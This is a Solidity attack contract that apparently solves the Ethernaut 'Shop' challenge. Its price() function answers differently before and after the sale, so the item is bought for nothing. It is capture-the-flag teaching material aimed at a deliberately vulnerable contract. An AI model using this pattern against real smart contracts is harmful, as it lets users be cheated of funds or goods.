// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// https://docs.eridian.xyz/ethereum-dev/defi-challenges/ethernaut/level-21-shop

interface IShop {
    function buy() external;

    function isSold() external view returns (bool);

    function price() external view returns (uint256);
}

contract AttackContract {
    function price() public view returns (uint256) {
        bool isSold = IShop(msg.sender).isSold();
        uint256 askedPrice = IShop(msg.sender).price();
        if (!isSold) {
            return askedPrice;
        } else {
            return 0;
        }
    }

    function buyFromShop(address _shopAddr) public {
        IShop(_shopAddr).buy();
    }
}
